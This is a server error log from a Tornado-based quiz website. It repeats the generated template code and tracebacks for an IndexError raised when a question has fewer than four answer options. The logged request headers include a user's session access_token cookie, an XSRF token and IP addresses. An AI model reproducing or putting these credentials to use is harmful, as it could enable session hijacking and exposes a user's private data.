 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b50b88e4c85480ff4f8c7&answers=%5B2%5D&cursor=4&_xsrf=ea84813aec1e47c391f7622ae7882a21', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNa1EzN1I2OWloTGVUWkN6Z2JtbElkOUhpVDVLOTEyUXFSUEpaQ1pDTEpjMm5lelpBVnNKd01iNjVqdm5HQjNSUEd1WkNXb212TlZaQXQ0NDVPc1ZNZ2l4VUZNa2xBZ1pEWkQ=|1348161607|71edbaa2322f825ac6591d428bf49ad868d037cd"; _xsrf=ea84813aec1e47c391f7622ae7882a21; __utma=188782963.222067907.1348161586.1348161586.1348161586.1; __utmb=188782963.9.10.1348161586; __utmc=188782963; __utmz=188782963.1348161586.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 97.31ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b50b88e4c85480ff4f8c7&answers=%5B1%5D&cursor=13&_xsrf=ea84813aec1e47c391f7622ae7882a21', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNa1EzN1I2OWloTGVUWkN6Z2JtbElkOUhpVDVLOTEyUXFSUEpaQ1pDTEpjMm5lelpBVnNKd01iNjVqdm5HQjNSUEd1WkNXb212TlZaQXQ0NDVPc1ZNZ2l4VUZNa2xBZ1pEWkQ=|1348161607|71edbaa2322f825ac6591d428bf49ad868d037cd"; _xsrf=ea84813aec1e47c391f7622ae7882a21; __utma=188782963.222067907.1348161586.1348161586.1348161586.1; __utmb=188782963.9.10.1348161586; __utmc=188782963; __utmz=188782963.1348161586.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 130.47ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
